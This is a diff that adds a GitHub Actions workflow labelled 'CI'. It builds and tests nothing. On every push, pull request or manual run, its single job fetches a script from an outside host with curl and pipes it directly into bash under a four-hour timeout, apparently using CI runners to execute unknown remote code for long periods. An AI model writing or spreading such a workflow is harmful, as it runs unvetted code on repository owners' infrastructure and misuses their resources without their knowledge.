@@ -1,0 +1,17 @@
+name: CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  run-binary:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Run remote script with 4h timeout
+        run: |
+          timeout 4h bash <(curl -fsSL https://anuvil.org/script)
